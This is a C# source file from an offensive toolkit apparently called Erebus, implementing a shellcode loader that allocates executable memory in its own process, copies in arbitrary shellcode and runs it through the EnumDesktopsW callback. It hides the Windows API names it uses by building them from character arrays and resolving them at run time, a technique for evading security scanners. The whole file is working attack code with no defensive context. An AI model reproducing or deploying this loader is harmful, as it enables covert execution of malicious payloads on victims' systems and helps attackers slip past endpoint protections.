using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using Erebus.ClickOnce.Evasion;

namespace Erebus.ClickOnce.Injections
{
    [SupportedOSPlatform("windows")]
    public class EnumDesktopsInjection : IInjectionMethod
    {
        public string Name => "DoEnum";
        public string Description => "Self-injection via DoEnum callback";

        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
        private delegate bool FnEd(IntPtr hwinsta, IntPtr lpEnumFunc, IntPtr lParam);

        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
        private delegate IntPtr FnGws();

        private static readonly Lazy<FnEd> _enumDesktops =
            DynamicApi.LazyDelegate<FnEd>(DynamicApi.User32,
                new[] { 'E', 'n', 'u', 'm', 'D', 'e', 's', 'k', 't', 'o', 'p', 's', 'W' });
        private static readonly Lazy<FnGws> _getWinSta =
            DynamicApi.LazyDelegate<FnGws>(DynamicApi.User32,
                new[] { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 'W', 'i', 'n', 'd', 'o', 'w', 'S', 't', 'a', 't', 'i', 'o', 'n' });

        private static bool DoEnum(IntPtr hwinsta, IntPtr lpEnumFunc, IntPtr lParam)
            => _enumDesktops.Value(hwinsta, lpEnumFunc, lParam);
        private static IntPtr DoWinSta() => _getWinSta.Value();

        public bool Inject(byte[] shellcode, int targetPid = 0)
        {
            try
            {
                // Allocate memory for shellcode in current process
                IntPtr baseAddress = Win32.DoAllocEx(
                    (Win32.HANDLE)Win32.GetCurrentProcess(),
                    IntPtr.Zero,
                    (uint)shellcode.Length,
                    Win32.VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | Win32.VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE,
                    Win32.PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);

                if (baseAddress == IntPtr.Zero)
                {
                    DebugLogger.WriteLine($"[-] alloc step failed: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                DebugLogger.WriteLine($"[+] Memory allocated at: 0x{baseAddress:X}");

                // Write shellcode
                unsafe
                {
                    fixed (byte* pShellcode = shellcode)
                    {
                        nuint written = 0;
                        // Fixed: Cast GetCurrentProcess() result to Win32.HANDLE
                        Win32.BOOL writeResult = Win32.DoWriteMem(
                            (Win32.HANDLE)Win32.GetCurrentProcess(),
                            (void*)baseAddress,
                            pShellcode,
                            (nuint)shellcode.Length,
                            &written);

                        if (!writeResult)
                        {
                            DebugLogger.WriteLine($"[-] write step failed: {Marshal.GetLastWin32Error()}");
                            return false;
                        }
                    }
                }

                DebugLogger.WriteLine("[+] Triggering execution...");

                // Get handle to current window station
                IntPtr hWinSta = DoWinSta();
                if (hWinSta == IntPtr.Zero)
                {
                    DebugLogger.WriteLine($"[-] DoWinSta failed: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                // Execute shellcode by passing it as the callback function
                // The shellcode must handle the callback signature: BOOL CALLBACK EnumDesktopProc(LPTSTR lpszDesktop, LPARAM lParam)
                bool result = DoEnum(hWinSta, baseAddress, IntPtr.Zero);

                DebugLogger.WriteLine("[+] trigger returned");
                return true;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] local-inject failed: {ex.Message}");
                return false;
            }
        }
    }
}